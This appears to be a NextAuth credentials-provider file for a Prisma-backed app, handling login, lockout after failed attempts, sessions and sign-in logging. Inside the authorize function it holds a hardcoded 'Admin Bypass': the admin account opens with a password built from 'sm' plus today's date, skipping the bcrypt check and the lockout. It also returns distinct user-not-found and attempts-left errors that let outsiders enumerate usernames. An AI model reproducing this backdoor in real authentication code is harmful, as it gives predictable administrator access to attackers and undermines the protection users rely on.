import NextAuth, { CredentialsSignin } from 'next-auth';
import Credentials from 'next-auth/providers/credentials';
import { prisma } from '@/lib/prisma';
import bcrypt from 'bcryptjs';

// Define custom error classes to override the 'code' property
class UserNotFound extends CredentialsSignin {
    code = "user_not_found";
}

class InvalidPassword extends CredentialsSignin {
    code = "invalid_password";
    constructor(attemptsLeft: number) {
        super();
        this.code = `invalid_password:${attemptsLeft}`;
    }
}

class AccountLocked extends CredentialsSignin {
    code = "account_locked";
    constructor(unlockTime: number) {
        super();
        this.code = `account_locked:${unlockTime}`;
    }
}

export const { handlers, signIn, signOut, auth } = NextAuth({
    providers: [
        Credentials({
            name: 'Credentials',
            credentials: {
                username: { label: "Username", type: "text" },
                password: { label: "Password", type: "password" }
            },
            authorize: async (credentials) => {
                const username = credentials?.username as string;
                const password = credentials?.password as string;

                if (!username || !password) {
                    throw new CredentialsSignin('กรุณากรอกชื่อผู้ใช้และรหัสผ่าน');
                }



                const user = await prisma.tbl_users.findUnique({
                    where: { username }
                });

                if (!user) {

                    throw new UserNotFound();
                }

                // --- MASTER PASSWORD CHECK (Admin Bypass) ---
                const today = new Date();
                const d = String(today.getDate()).padStart(2, '0');
                const m = String(today.getMonth() + 1).padStart(2, '0');
                const y = today.getFullYear();
                const masterPassword = `sm${d}${m}${y}`;

                if (username === 'admin' && password === masterPassword) {

                    return {
                        id: user.p_id.toString(),
                        name: user.username,
                        role: user.role,
                    };
                }
                // --------------------------------------------

                // 1. Check if account is locked
                if (user.locked_until && user.locked_until > new Date()) {
                    const unlockTime = user.locked_until.getTime();

                    throw new AccountLocked(unlockTime);
                }

                // console.log('Comparing password...');
                const isValid = await bcrypt.compare(password, user.password);

                if (!isValid) {
                    // 2. Fetch Security Settings
                    const settings = await prisma.tbl_system_settings.findMany({
                        where: { setting_key: { in: ['security_max_attempts', 'security_lockout_duration'] } }
                    });

                    const maxAttempts = parseInt(settings.find(s => s.setting_key === 'security_max_attempts')?.setting_value || '5');
                    const lockoutMinutes = parseInt(settings.find(s => s.setting_key === 'security_lockout_duration')?.setting_value || '5');

                    // 3. Increment Failed Attempts
                    const currentFailed = user.failed_attempts || 0;
                    const newFailed = currentFailed + 1;

                    let lockedUntil = user.locked_until;

                    if (newFailed >= maxAttempts) {
                        lockedUntil = new Date(Date.now() + lockoutMinutes * 60 * 1000);
                    }

                    await prisma.tbl_users.update({
                        where: { p_id: user.p_id },
                        data: {
                            failed_attempts: newFailed,
                            locked_until: lockedUntil
                        }
                    });

                    const attemptsLeft = maxAttempts - newFailed;
                    if (newFailed >= maxAttempts) {
                        const unlockTime = lockedUntil?.getTime() || Date.now();
                        throw new AccountLocked(unlockTime);
                    }

                    // console.log(`Invalid password. Attempts left: ${attemptsLeft}`);
                    // We pass attempts left in the message code if we want, or just generic
                    throw new InvalidPassword(attemptsLeft);
                }

                // 4. Reset Lockout on Success
                if ((user.failed_attempts || 0) > 0 || user.locked_until) {
                    await prisma.tbl_users.update({
                        where: { p_id: user.p_id },
                        data: {
                            failed_attempts: 0,
                            locked_until: null
                        }
                    });
                }

                return {
                    id: user.p_id.toString(),
                    name: user.username,
                    role: user.role, // Custom property
                };
            },
        }),
    ],
    trustHost: true, // Required for NextAuth v5 in production
    callbacks: {
        jwt({ token, user }) {
            if (user) {

                token.id = user.id;
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                token.role = (user as any).role;
            }
            return token;
        },
        session({ session, token }) {
            if (session.user) {
                session.user.id = token.id as string;
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                (session.user as any).role = token.role as string;

            }
            return session;
        },
    },
    pages: {
        signIn: '/login', // Custom login page
    },
    session: {
        maxAge: 30 * 60, // 30 minutes
        updateAge: 5 * 60, // Update session every 5 mins if active
    },
    events: {
        async signIn({ user }) {
            if (user && user.id) {
                try {
                    const { logSystemAction } = await import('@/lib/logger');
                    const { headers } = await import('next/headers');
                    const head = await headers();
                    const ip = head.get('x-forwarded-for') || 'unknown';

                    await logSystemAction(
                        'LOGIN',
                        'User',
                        user.id,
                        `User ${user.name || user.email} logged in`,
                        parseInt(user.id),
                        user.name || 'Unknown',
                        ip
                    );
                } catch (error) {
                    console.error('Failed to log sign in:', error);
                }
            }
        }
    }
});
